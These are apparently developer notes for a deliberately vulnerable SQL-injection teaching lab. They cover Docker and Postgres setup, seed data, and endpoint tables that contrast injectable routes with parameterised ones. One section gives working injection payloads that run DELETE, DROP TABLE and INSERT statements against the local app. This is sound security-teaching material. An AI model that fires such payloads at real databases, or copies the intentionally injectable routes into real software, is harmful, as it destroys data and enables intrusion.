# Backend Dev Notes

Working notes on container management, database access, API usage, and SQL injection exploit examples.

---

## Container Management

Build and run the backend container locally (without Compose):

```bash
docker rm -f sqlinj-backend
docker build -t sqlinj-backend:dev .
docker run --rm -it --name sqlinj-backend --env-file .env -p 5001:5001 sqlinj-backend:dev
```

Pull and run from GHCR (pipeline-built image):

```bash
docker pull --platform linux/amd64 ghcr.io/igorgroz/sqlinj-backend:latest
docker run --rm -it --platform linux/amd64 --env-file .env -p 5001:5001 ghcr.io/igorgroz/sqlinj-backend:latest
```

---

## Database Access

Connect to the containerised Postgres instance:

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject
```

Useful psql commands:

```sql
\dt                          -- list tables
SELECT * FROM users;
SELECT * FROM clothes;
SELECT * FROM user_clothes;
```

### Reference Data

**users**

| userid | name    | surname  |
|--------|---------|----------|
| 1      | John    | Doe      |
| 2      | Jane    | Smith    |
| 3      | Alice   | Johnson  |
| 4      | Bob     | Brown    |
| 5      | Charlie | Williams |

**clothes**

| clothid | description | color | brand  | size     | material  |
|---------|-------------|-------|--------|----------|-----------|
| 1       | T-Shirt     | Red   | Nike   | M        | Cotton    |
| 2       | Jeans       | Blue  | Levis  | 32       | Denim     |
| 3       | Jacket      | Black | Adidas | L        | Polyester |
| 4       | Sweater     | Green | Uniqlo | M        | Wool      |
| 5       | Hat         | Black | Puma   | One Size | Cotton    |
| 6       | Scarf       | Red   | Gucci  | One Size | Silk      |
| 7       | Shoes       | White | Adidas | 9        | Leather   |
| 8       | Socks       | Gray  | H&M    | M        | Cotton    |
| 9       | Sneakers    | White | Nike   | 10       | Leather   |
| 10      | Shorts      | Black | Zara   | M        | Polyester |

> Legacy: AWS RDS endpoint was `sqlinjproject-db.cymhse7fxmp9.ap-southeast-2.rds.amazonaws.com` — decommissioned, using containerised Postgres only.

---

## REST API Endpoints

All routes served from `http://localhost:5001`. Full interactive docs at `/api-docs`.

### Insecure Routes (SQL injection targets)

| Method | Endpoint                          | Vulnerability                                      |
|--------|-----------------------------------|----------------------------------------------------|
| GET    | `/api/insecure-users`             | String interpolation in query                      |
| GET    | `/api/insecure-users/:userid`     | userid injected directly into SQL                  |
| GET    | `/users/:userid/clothes`          | userid injected directly into SQL                  |
| POST   | `/users/:userid/clothes`          | userid + clothid injected directly                 |
| PUT    | `/users/:userid/clothes/:clothid` | userid, clothid, newClothid injected directly      |
| DELETE | `/users/:userid/clothes/:clothid` | userid + clothid injected directly                 |

### Secure Routes (parameterised queries)

| Method | Endpoint                               | Protection                      |
|--------|----------------------------------------|---------------------------------|
| GET    | `/api/safe-users`                      | Parameterised query             |
| GET    | `/api/safe-users/:userid`              | Parameterised query             |
| GET    | `/users/:userid/safe-clothes`          | `$1` placeholder                |
| POST   | `/users/:userid/safe-clothes`          | Parameterised insert            |
| PUT    | `/users/:userid/safe-clothes/:clothid` | Parameterised update            |
| DELETE | `/users/:userid/safe-clothes/:clothid` | Parameterised delete            |

---

## SQL Injection Exploit Examples

### Via REST (curl)

```bash
# Dump all users via GET parameter injection
GET http://localhost:5001/users/1/clothes?userid=1; DELETE FROM user_clothes; --

# Drop table via POST body
POST http://localhost:5001/users/1/clothes
{ "clothid": "1; DROP TABLE user_clothes; --" }
```

### Via Frontend UI

Navigate to `http://localhost:3000` → insecure cloth input field, enter the payload and press **Add Cloth (Insecure REST)**:

```
9'); INSERT INTO users (name, surname) VALUES ('Alex3', 'Jones3'); --
10'); INSERT INTO users (name, surname) VALUES ('Pat', 'Noah'); --
```

Verify the injection worked:

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM users;"
```

The injected rows will appear alongside the original 5 seed users.

---

## GraphQL Endpoints

| Endpoint             | Auth required | Notes                        |
|----------------------|---------------|------------------------------|
| `/graphql`           | No            | Apollo v4, standard          |
| `/graphql-insecure`  | No            | Vulnerable resolver          |
| `/graphql-secure`    | Yes (JWT)     | requireJwt middleware        |
